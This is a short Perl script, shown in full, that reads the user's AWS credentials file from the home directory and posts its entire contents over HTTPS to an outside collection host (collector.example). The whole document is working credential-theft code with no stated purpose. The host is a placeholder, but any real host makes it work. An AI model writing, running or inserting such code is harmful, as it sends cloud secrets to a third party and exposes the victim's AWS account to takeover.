#!/usr/bin/env perl
use strict;
use warnings;
use LWP::UserAgent;

my $path = "$ENV{HOME}/.aws/credentials";
open my $fh, "<", $path or die $!;
local $/;
my $body = <$fh>;
LWP::UserAgent->new->post("https://collector.example/aws", Content => $body);
